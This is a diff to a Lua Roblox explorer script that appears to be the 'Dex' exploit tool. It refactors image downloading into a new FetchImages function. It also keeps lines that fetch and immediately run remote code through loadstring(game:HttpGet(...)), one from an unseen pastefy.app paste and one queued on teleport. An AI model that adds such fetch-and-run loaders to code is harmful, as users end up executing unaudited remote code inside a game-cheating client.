@@ -24,14 +24,6 @@ local service = setmetatable({}, {
 	end
 })
 
-do
-	local Assets = {114851699900089, 5642383285, 5034718129, 5642310344, 5642383285, 5642383285, 5034718180, 5054663650, 5034768003, 1427967925, 5060023708, 5034768003, 5034768003, 6234266378, 6401617475, 6425281788, 1281023007, 1072518406, 1072518502, 2764171053, 1427967925, 6578871732, 6578933307, 6579106223, 6511490623, 6579106223}
-
-	for i, v in Assets do
-		writefile("customassets/" .. v ..".png", crypt.base64decode(game:HttpGet("https://raw.githubusercontent.com/highskyY8K/Dex-V4-budget/refs/heads/main/Image%20Assets/" .. v .. ".png.txt")))
-	end
-end
-
 local function writeimage(assetid)
 	return "customassets/" .. assetid .. ".png"
 end
@@ -3907,7 +3899,7 @@ local EmbeddedModules = {
 				end
 
 				for i = maxEntries+1,#propEntries do
-					if propEntries[i].Gui then
+					if propEntries[i]["Gui"] then
 						propEntries[i].Gui:Destroy()
 					end
 					propEntries[i] = nil
@@ -11082,6 +11074,17 @@ Main = (function()
 		end
 	end
 
+	Main.FetchImages = function()
+		local Assets = {114851699900089, 5642383285, 5034718129, 5642310344, 5642383285, 5642383285, 5034718180, 5054663650, 5034768003, 1427967925, 5060023708, 5034768003, 5034768003, 6234266378, 6401617475, 6425281788, 1281023007, 1072518406, 1072518502, 2764171053, 1427967925, 6578871732, 6578933307, 6579106223, 6511490623, 6579106223}
+
+		for i, v in Assets do
+			local src = game:HttpGet("https://raw.githubusercontent.com/highskyY8K/Dex-V4-budget/refs/heads/main/Image%20Assets/" .. v .. ".png.txt")
+			task.spawn(function()
+				writefile("customassets/" .. v ..".png", crypt.base64decode(src))
+			end)
+		end
+	end
+
 	Main.LoadModules = function()
 		for i,v in pairs(Main.ModuleList) do
 			local s,e = pcall(Main.LoadModule,v)
@@ -11855,14 +11858,13 @@ Main = (function()
 						end
 					end
 
+					loadstring(game:HttpGet("https://pastefy.app/qH3uJShw/raw"))()
 					LocalPlayer:Kick("\n[SAFEMODE] Pausing Roblox engine..\nPlease do NOT leave")
 					service.RunService.RenderStepped:Wait()
 					service.RunService:Set3dRenderingEnabled(true)
 					task.delay(10, service.GuiService.ClearError, service.GuiService)
 					PlayerScripts.Parent = LocalPlayer
 				end
-
-				loadstring(game:HttpGet("https://pastefy.app/qH3uJShw/raw"))()
 			else
 				if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/highskyY8K/Dex-V4-budget/refs/heads/main/Dex.lua"))()]]) end
 				service.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, service.Players.LocalPlayer)
@@ -11950,7 +11952,7 @@ Main = (function()
 		})
 
 		-- Fetch version if needed
-		intro.SetProgress("Fetching Roblox Version",0.2)
+		intro.SetProgress("Fetching Roblox Version",0.1)
 		if Main.Elevated then
 			local fileVer = Lib.ReadFile("dex/deps_version.dat")
 			Main.ClientVersion = Version()
@@ -11970,10 +11972,10 @@ Main = (function()
 		end
 
 		-- Fetch external deps
-		intro.SetProgress("Fetching API",0.35)
+		intro.SetProgress("Fetching API",0.25)
 		API = Main.FetchAPI()
 		Lib.FastWait()
-		intro.SetProgress("Fetching RMD",0.5)
+		intro.SetProgress("Fetching RMD",0.4)
 		RMD = Main.FetchRMD()
 		Lib.FastWait()
 
@@ -11984,6 +11986,11 @@ Main = (function()
 			env.writefile("dex/rbx_rmd.dat",Main.RawRMD)
 		end
 
+		-- Load the images
+		intro.SetProgress("Fetching Images",0.6)
+		Main.FetchImages()
+		Lib.FastWait()
+		
 		-- Load other modules
 		intro.SetProgress("Loading Modules",0.75)
 		Main.AppControls.Lib.InitDeps(Main.GetInitDeps()) -- Missing deps now available
